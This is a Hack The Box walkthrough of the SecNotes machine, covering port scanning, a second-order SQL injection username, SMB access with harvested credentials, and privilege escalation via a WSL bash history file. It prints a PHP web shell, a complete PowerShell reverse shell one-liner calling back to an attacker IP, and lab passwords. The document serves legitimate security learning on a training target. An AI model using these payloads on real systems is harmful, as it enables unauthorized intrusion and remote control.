# HTB - SecNotes

#### Ip: 10.10.10.97
#### Name: SecNotes
#### Rating: Medium

----------------------------------------------------------------------

SecNotes.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up:

```text
┌──(ryan㉿kali)-[~/HTB/SecNotes]
└─$ sudo nmap -p- --min-rate 10000 10.10.10.97
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 14:19 CDT
Nmap scan report for 10.10.10.97
Host is up (0.068s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
```

Looks like just a few open ports here. Let dig a bit deeper by using the `-sC` and `-sV` flags to use basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/HTB/SecNotes]
└─$ sudo nmap -sC -sV -T4 10.10.10.97 -p 80,445,8808                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 14:22 CDT
Nmap scan report for 10.10.10.97
Host is up (0.067s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-05-16T12:23:03-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-05-16T19:23:04
|_  start_date: N/A
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.15 seconds
```

Checking out the webpage on port 80, we see a simple login page:

login.png

After trying several weak password combos and basic login bypasses via SQL injection, I decided to try creating a new user. But rather than a normal username (admin:password) I tried a second order SQL injection and created a user `' or 1='1` with a password of Password123!. This was an attempt to exploit a SQL injection and get access to the database via a login.

signup.png

It worked! After logging in as the created 'user' I was able to grab what appear to be a username and password: `tyler:92g!mA8BGjOirkL%OG*&`

Lets try to use these credentials with SMB. 

smbmap.png

Cool, I was able to see which shares I can access as user Tyler. What catches my eye is that I have both read and write permissions to the `new-site` share. Lets check that out:

smbclient.png

Interesting, this appears to be a share containing IIS information. Recalling back to our initial Nmap scan I remembered there were two HTTP pages, one on port 80, and the other on port 8808.

Navigating to http://10.10.10.97:8808/ sure enough we find an IIS landing page.

Lets upload a web shell to the SMB share and see if we can get execution that way. 

### Exploitation

Firstly we need to create a file we'll call shell.php

```text
┌──(ryan㉿kali)-[~/HTB/SecNotes]
└─$ cat >> shell.php
<?php echo shell_exec($_GET['cmd']); ?>
```

Next we can upload it to the SMB share using the `put` command:

```text
┌──(ryan㉿kali)-[~/HTB/SecNotes]
└─$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (0.2 kb/s) (average 0.1 kb/s)
```
Navigating to the file in the browser we can confirm we now have execution on the machine.

whoami.png

Lets grab a PowerShell reverse shell from https://www.revshells.com/ and URL encode it:

```powershell
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.19', 443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```

After setting up a netcat listener and issuing the PowerShell one liner as a cmd, we catch a shell back and can grab the user.txt flag:

user_flag.png

### Privilege Escalation

Checking out the contents of `C:\` we see an interesting file, Ubuntu.zip:

ubuntu.png

This makes me wonder if the machine is running Windows Subsystem for Linux. 

After Googling around a bit I find I can access the Linux system at `AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState/rootfs/root`

And sure enough I find I can access the root directory:

root_dir.png

And interestingly, the `.bash_history` file doesn't appear to be empty, or dumping to `/dev/null`:

Taking a look it appears we have an admin credential stored in memory!

```text
SHELL> cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
```

Lets use impacket-psexec to login and grab the root.txt flag

root_flag.png

That was a super fun box with some interesting concepts in it. It was especially fun working with Windows Subsystem for Linux because I haven't played with that too much and it was great to learn more about it.

Thanks for following along!

-Ryan

-----------------------------------------------------------